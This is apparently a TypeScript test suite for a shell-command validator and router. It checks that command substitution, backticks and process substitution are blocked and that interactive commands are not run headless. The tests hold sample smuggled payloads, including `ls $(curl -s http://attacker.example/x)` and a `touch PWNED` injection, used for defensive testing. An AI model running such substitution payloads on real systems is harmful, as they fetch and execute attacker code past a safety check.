import { mkdir, mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { validate } from "../src/safety/validator.js";
import { findDenyMatches } from "../src/safety/denylist.js";
import { routeOnce } from "../src/router/route-once.js";
import { invalidateRulesCache } from "../src/rules/loader.js";

/**
 * The validator reasons about text. `$(…)` defers the decision to run time,
 * so a command that looks vetted can carry an arbitrary payload past every
 * other pattern — `ls $(curl -s http://attacker/x)` used to classify and run
 * locally. No built-in rule emits command substitution, so the whole
 * construct belongs to the AI.
 */

describe("command substitution is denied", () => {
  it("blocks $(...)", () => {
    const v = validate("ls $(curl -s http://attacker.example/x)");
    expect(v.allowed).toBe(false);
    expect(v.patternId).toBe("command-substitution");
  });

  it("blocks $(...) nested inside an otherwise harmless command", () => {
    expect(validate("echo hello $(whoami)").allowed).toBe(false);
  });

  it("blocks backtick substitution", () => {
    const v = validate("echo `whoami`");
    expect(v.allowed).toBe(false);
    expect(v.patternId).toBe("backtick-substitution");
  });

  it("blocks process substitution", () => {
    expect(validate("diff <(ls a) <(ls b)").allowed).toBe(false);
  });

  it("keeps ordinary variable expansion allowed", () => {
    // $HOME is expanded by the shell but cannot execute anything.
    expect(validate("echo $HOME").allowed).toBe(true);
    expect(validate("git log --format=%H").allowed).toBe(true);
  });

  it("keeps a bare dollar sign allowed", () => {
    expect(validate("grep '\\$' file.txt").allowed).toBe(true);
  });

  it("reports the substitution patterns through findDenyMatches", () => {
    expect(findDenyMatches("x $(y)").some((h) => h.id === "command-substitution")).toBe(true);
    expect(findDenyMatches("x `y`").some((h) => h.id === "backtick-substitution")).toBe(true);
  });
});

describe("routeOnce refuses substitution end-to-end", () => {
  let home: string;
  let origEnv: NodeJS.ProcessEnv;

  beforeEach(async () => {
    origEnv = { ...process.env };
    home = await mkdtemp(join(tmpdir(), "ninja-sub-"));
    process.env.XDG_CONFIG_HOME = join(home, "config");
    await mkdir(process.env.XDG_CONFIG_HOME, { recursive: true });
    invalidateRulesCache();
  });

  afterEach(async () => {
    process.env = origEnv;
    invalidateRulesCache();
    await rm(home, { recursive: true, force: true });
  });

  it("does not execute a substitution payload", async () => {
    const result = await routeOnce(`ls $(touch ${join(home, "PWNED")})`, { cwd: home });
    expect(result.handled).toBe(false);
    if (!result.handled) expect(result.reason).toBe("safety_block");
  });
});

describe("requires_tty rules are handed back, not run headless", () => {
  let home: string;
  let origEnv: NodeJS.ProcessEnv;

  beforeEach(async () => {
    origEnv = { ...process.env };
    home = await mkdtemp(join(tmpdir(), "ninja-tty-"));
    process.env.XDG_CONFIG_HOME = join(home, "config");
    await mkdir(process.env.XDG_CONFIG_HOME, { recursive: true });
    invalidateRulesCache();
  });

  afterEach(async () => {
    process.env = origEnv;
    invalidateRulesCache();
    await rm(home, { recursive: true, force: true });
  });

  it("rejects docker exec instead of failing with 'not a TTY'", async () => {
    const result = await routeOnce("docker exec -it web sh", { cwd: home });
    expect(result.handled).toBe(false);
    if (!result.handled) expect(result.reason).toBe("requires_tty");
  });

  it("rejects kubectl exec too", async () => {
    const result = await routeOnce("kubectl exec -it pod-1 -- sh", { cwd: home });
    expect(result.handled).toBe(false);
    if (!result.handled) expect(result.reason).toBe("requires_tty");
  });

  it("still handles the non-interactive sibling command", async () => {
    const result = await routeOnce("pwd", { cwd: home });
    expect(result.handled).toBe(true);
  });
});
